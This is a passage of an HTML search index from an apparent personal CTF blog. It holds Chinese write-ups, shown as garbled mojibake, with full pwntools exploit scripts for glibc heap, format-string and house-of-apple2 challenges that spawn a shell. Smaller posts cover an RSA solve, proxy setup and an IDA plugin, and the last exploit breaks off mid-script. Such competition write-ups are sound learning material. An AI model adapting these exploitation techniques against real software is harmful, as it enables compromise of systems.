">[CISCN 2022 åˆèµ›]newest_note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4UNuWjKnk/"" data-c="
          &lt;p&gt;è¿™å‡ å¤©æ¯”èµ›å¤šï¼Œä¸€å¤§å †é¢˜ç›®ç­‰ç€å¤ç°ï¼Œå…ˆæŠŠè¿™é“å‰é˜µå­åšçš„é¢˜è¡¥äº†&lt;br&gt;
2.27çš„èœå•é¢˜ï¼Œæ¼æ´åœ¨deleteå‡½æ•°é‡Œé¢&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136049178.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œç¨‹åºçš„addå‡½æ•°æ¯æ¬¡åˆ›å»ºå †å—æ—¶éƒ½ä¼šé¢å¤–åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º0x10çš„å †å—ä½œä¸ºæŒ‡é’ˆå †å—ï¼ŒæŒ‡é’ˆæŒ‡å‘åˆ›å»ºå †å—çš„content&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136810972.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å…·ä½“ä¾‹å­ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136837705.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹ä¹ æƒ¯ida hide castsäº†ï¼Œæ•°æ®ç±»å‹éšè—ï¼Œç»“æœåŠå¤©æ²¡æ‰¾åˆ°æ€ä¹ˆåˆ©ç”¨å †å—æŒ‡é’ˆçš„ç‚¹&lt;br&gt;
åé¢è‚–ç¥è®²è§£ä¹‹åç®—æ˜¯æç„¶å¤§æ‚Ÿäº†&lt;br&gt;
intå‹æ¯”è¾ƒä½4å­—èŠ‚ï¼Œè€Œv1åŸæœ¬8å­—èŠ‚ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿è¯v1çš„ä½4å­—èŠ‚å¤§äºç­‰äº0ï¼ŒäºŒè¿›åˆ¶çš„æœ€é«˜ä½ä¸º1ï¼ˆç¬¬64ä½ï¼‰å³å¯ç»•è¿‡æ­¤åˆ¤æ–­&lt;br&gt;
è€Œ&lt;code&gt;free()&lt;/code&gt;çš„å¯»å€æŒ‰v1çš„ä½4å­—èŠ‚ * 8å»æ‰¾ï¼Œå®é™…ä¸Šçš„åç§»æ˜¯&lt;code&gt;(ç›®æ ‡å †å—åœ°å€-(heap_addr+0x260))&amp;gt;&amp;gt;3&lt;/code&gt;å³å¯ï¼Œå¦‚ä¸‹å›¾&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136537304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136542956.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªè¦æ§åˆ¶äº†æŒ‡é’ˆå †å—æ­¤é¢˜å°±ç»ˆç»“äº†ï¼Œå…·ä½“è¯´æ˜çœ‹ä¸‹é¢&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chall&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)

add(0x80) #0 
add(0x80) #1
delete(1)
delete(0)
add(0x80) #0
show(0)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c0
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
# add(0x10)
edit(0,cyclic(0x80))

for i in range(7):
    add(0x80)

add(0x10) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(0x80) #0~6

add(0x10) #7
show(7)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))+0x1bc8-libc.sym[b&amp;quot;__free_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f322

gdb.attach(io)
pause()

print(&amp;quot;free_hook: &amp;quot;,hex(free_hook))

edit(7,p64(heap_addr+0x870)) #chunk 8çš„æŒ‡é’ˆå †å—
edit(1,p64(heap_addr+0x7e0)) #chunk1å†…å®¹å †å—-&amp;gt;chunk 7çš„å†…å®¹å †å—-&amp;gt;chunk 8çš„æŒ‡é’ˆå †å—


###ä»»æ„åœ°å€freeï¼Œæ­¤å¤„freeçš„æ˜¯chunk 1çš„å†…å®¹å †å—
idx=((1&amp;lt;&amp;lt;63)+0x84) - (1&amp;lt;&amp;lt;64) 
delete(idx)
print(hex(idx))
###åç§»ç”¨(chunk 1å†…å®¹å †å—åœ°å€-(heap_addr+0x260))&amp;gt;&amp;gt;3å³å¯
###å…·ä½“çœ‹åç¼–è¯‘ådeleteå‡½æ•°å†…å®¹


add(0x10) #9
edit(9,p64(free_hook))  #chunk 9å®é™…ä¸Šæ˜¯chunk 8çš„æŒ‡é’ˆå †å—
edit(8,p64(shell)) #ä¿®æ”¹chunk 8å†…å®¹ä¸ºone_gadget
print(&amp;quot;shell: &amp;quot;,hex(shell))
delete(8) #deleteå³å¯getshell

io.interactive()

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;æœ¬æœºç¯å¢ƒå¯ä»¥æ‹¿shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690137134855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿˜æœ‰ä¸€å¤§å †é¢˜æ²¡è¡¥ï¼Œæ—¶é—´å¤šæ¥ç‚¹ğŸ˜¿ğŸ˜¿ğŸ˜¿&lt;/p&gt;
">ä¸€é“æˆ‘ä¹Ÿä¸çŸ¥é“åå­—çš„å †é¢˜å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LMCf1vtkj/"" data-c="
          &lt;p&gt;è®°å½•ä¸‹host clashçš„ipå’Œç«¯å£&lt;br&gt;
ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ›´æ”¹vmwareç½‘ç»œé€‚é…å™¨ä¸ºNAT&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689763491561.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ubuntuä¸‹ç½‘ç»œè®¾ç½®é»˜è®¤ï¼Œä»£ç†è®¾ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1689763558947.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç»ˆç«¯é…ç½®&lt;br&gt;
ä¿®æ”¹&lt;code&gt;~/.bashrc&lt;/code&gt;ï¼Œæ·»åŠ &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export https_proxy=http://10.16.1.102:7890
export http_proxy=http://10.16.1.102:7890
export all_proxy=socks5://10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€å&lt;code&gt;source ~/.bashrc&lt;/code&gt;ç”Ÿæ•ˆ&lt;/p&gt;
&lt;p&gt;gitèµ°ä»£ç†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --global http.https://github.com.proxy socks5://10.16.1.102:7890
git config --global http.proxy 10.16.1.102:7890
git config --global https.proxy 10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰‹åŠ¨æ›´æ”¹gitä»£ç†è®¾ç½®&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --show-origin http.proxy
&lt;/code&gt;&lt;/pre&gt;
">Ubuntuè™šæ‹Ÿæœºèµ°hostçš„clashä»£ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/FVrMrT-Fy/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;fmt&#34;&gt;fmtï¼š&lt;/h4&gt;
&lt;p&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€æ¬¡æ³„éœ²æ ˆåœ°å€å’Œlibcï¼Œç¬¬äºŒæ¬¡å†™retåœ°å€ä¸ºone_gadgetå³å¯&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;60.204.140.184&amp;quot;,30191)
# io=process(&amp;quot;./fmt&amp;quot;)
elf=ELF(&amp;quot;./fmt&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)


io.recvuntil(b&amp;quot;str: &amp;quot;)
payload=b&amp;quot;%8$p.%16$p&amp;quot;
io.sendline(payload)

leak_addr=int(io.recv(14),16)-0x1e94a0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))



sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
puts_addr=leak_addr+libc.sym[b&amp;quot;puts&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
_exit=leak_addr+libc.sym[b&amp;quot;_exit&amp;quot;]
shell=leak_addr+0xe3b01

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;other str: &amp;quot;)
payload=fmtstr_payload(6,{stack_addr-0xe8:shell},write_size=&#39;short&#39;)
# payload =fmtstr_payload(6,{malloc_hook:shell},write_size=&#39;short&#39;)+b&amp;quot;%1000000c&amp;quot;
io.sendline(payload)


print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;shell: &amp;quot;+hex(shell))


io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC:&lt;/h3&gt;
&lt;h4 id=&#34;usb&#34;&gt;usb:&lt;/h4&gt;
&lt;p&gt;ä½¿ç”¨mumuzié”®ç›˜æµé‡ä¸€æŠŠæ¢­ï¼Œç„¶åcyberchefçƒ¹é¥ªå³å¯ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689507053305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689507058855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto&#34;&gt;Cryptoï¼š&lt;/h3&gt;
&lt;h4 id=&#34;rsa&#34;&gt;RSA:&lt;/h4&gt;
&lt;p&gt;qwbåŸé¢˜...&lt;br&gt;
[link]&lt;a href=&#34;https://eprint.iacr.org/2015/399.pdf&#34;&gt;https://eprint.iacr.org/2015/399.pdf&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689510786286.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ€ålong_to_byteså³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from gmpy2 import *
m1=8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221
m2=22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079
n2=26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977
e2=65537
c2=15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437

r=7
PR = PolynomialRing(Zmod(n2),name=&#39;x&#39;)
x=PR.gen()
fx=m1*m2*x-(m1-m2)
fx=fx.monic()
xx=int(fx.small_roots(X=2^690,beta=0.7,epsilon=0.4)[0])
pp6=gcd(m1*m2*xx-(m1-m2),n2)
A=iroot(pp6,6)
assert A[1]
p=A[0]
q=n2//(pp6*p)
phi = (p**(r-1))*(p-1)*(q-1)
d=invert(e2,phi)

print(pow(c2,d,n2))
&lt;/code&gt;&lt;/pre&gt;
">HWS2023 é¢„é€‰èµ› orrr wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/cbkv3xavp/"" data-c="
          &lt;h3 id=&#34;mipsrophttpsgithubcomoraclepiida_pluginstreemainmipsrop&#34;&gt;mipsropï¼š&lt;a href=&#34;https://github.com/OraclePi/IDA_plugins/tree/main/mipsrop&#34;&gt;https://github.com/OraclePi/IDA_plugins/tree/main/mipsrop&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;å°†ä¸Šè¿°é“¾æ¥ä¸­çš„æ–‡ä»¶å¤åˆ¶åˆ°idaå®‰è£…ç›®å½•çš„pluginsç›®å½•ä¸‹&lt;br&gt;
æ’ä»¶è¿è¡Œæ—¶è¾“å‡ºçª—å£å†…å®¹å¦‚ä¸‹å³æˆåŠŸ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Propagating type information...
Function argument information has been propagated
The initial autoanalysis has been finished.
MIPS ROP Finder activated, found 1077 controllable jumps between 0x00000000 and 0x0008A1D4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœè¿è¡ŒæŒ‡ä»¤æŠ¥é”™&lt;code&gt;NameError: name &#39;mipsrop&#39; is not defined&lt;/code&gt;&lt;br&gt;
idapythonä¸­è¾“å…¥å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import mipsrop
mipsrop = mipsrop.MIPSROPFinder()
&lt;/code&gt;&lt;/pre&gt;
">mipsropé…ç½®</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JYkjVlphv/"" data-c="
          &lt;p&gt;glibc 2.35-0ubuntu3.1_amd64&lt;br&gt;
house of apple2&lt;br&gt;
åªç»™äº†ä¸€æ¬¡uafçš„æœºä¼šï¼Œæ‰€ä»¥éœ€è¦å¯¹uafçš„å †å—é‡å¤åˆ©ç”¨&lt;br&gt;
ç¬¬ä¸€æ¬¡æ³„éœ²libcï¼Œç¬¬äºŒæ¬¡ç”³è¯·æ—¶overlapæ³„éœ²å †åœ°å€&lt;br&gt;
åç»­å°±æ˜¯æ­£å¸¸house of apple2æµç¨‹&lt;br&gt;
å¯ä»¥æ‰“one_gadgetï¼Œè¿™é‡Œæˆ‘ä»¬ä¿®æ”¹&lt;code&gt;_flags&lt;/code&gt;ä¸º&lt;code&gt;  sh;&lt;/code&gt;æ‰“systemè·å–shell&lt;br&gt;
æ³¨æ„å †å—æ„é€ ï¼Œå¤§å°ä¸è¶…è¿‡0x200ï¼Œä¸‹æ ‡ä¸è¶…è¿‡12ï¼›&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28065)
# io=process(&amp;quot;./happy_note&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(s,n,m):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;[2]\n&amp;quot;,str(m)) #1-&amp;gt;calloc  2-&amp;gt;malloc 

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;show?\n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def func(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;666&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    
def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b&amp;quot;&amp;quot;
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file

# gdb.attach(io)
# pause()

for i in range(11):
    add(0x100,i,1)

for i in range(7):
    delete(i)

func(7)
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
_IO_list_all_chain=_IO_list_all+0x88
_IO_wfile_jumps=leak_addr+libc.sym[b&amp;quot;_IO_wfile_jumps&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0xebcf1


add(0x100,0,1) #7

delete(9)
delete(7) #tcachebin 0

show(0) #tcachebin 0
io.recvuntil(b&amp;quot;content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0xc20
key=heap_addr&amp;gt;&amp;gt;12
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(0x100,2,1)
add(0xe8,3,1) #new 0 , uaf , editable
add(0xe8,4,1)

delete(4)
delete(3)

edit(0,p64(key^_IO_list_all))

add(0xe8,5,2) #5
add(0xe8,6,2) #6

add(0x1e8,7,1) #7
add(0x200,11,1) #11
#chunk 10  heap_addr+0xd30
fake_wide_data=heap_addr+0xd40 #chunk 10 content 
fake_jump=heap_addr+0xf30 # chunk 7
fake_IO=heap_addr+0x1120 # chunk 11

_wide_data=b&amp;quot;&amp;quot;
_wide_data=_wide_data.ljust(0x18,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0x30,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0xe0,b&amp;quot;\x00&amp;quot;)+p64(fake_jump)
edit(10,_wide_data)


edit(6,p64(fake_IO))
payload=b&amp;quot;\x00&amp;quot;*0x58+p64(shell)
payload=payload.ljust(0x1e0,b&amp;quot;\x00&amp;quot;)+b&amp;quot;  sh;&amp;quot;
edit(7,payload)
edit(11,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))

delete(9)


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[å·…å³°æå®¢ 2022]happy note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/apppplllllllleeeeeee/"" data-c="
          &lt;h3 id=&#34;without_hook&#34;&gt;without_hook:&lt;/h3&gt;
&lt;p&gt;2.36çš„glibc&lt;br&gt;
æœ€å¼€å§‹æƒ³ç”¨house of bananaæ‰“ï¼Œç»“æœå‘ç°libcå’Œldåç§»ä¸å›ºå®š&lt;br&gt;
æ­¤é¢˜é€‰æ‹©æ‰“house of apple2&lt;br&gt;
&lt;code&gt;magic_gadget&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡&lt;code&gt;magic_gadget&lt;/code&gt;å’Œ&lt;code&gt;setcontext+61&lt;/code&gt;åŠ«æŒrsp,è¯¦ç»†è¯´æ˜æ”¾åœ¨expäº†&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def exit():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;5&amp;quot;)

def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b&amp;quot;&amp;quot;
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file


add(0,0x608) #fake_wide_data
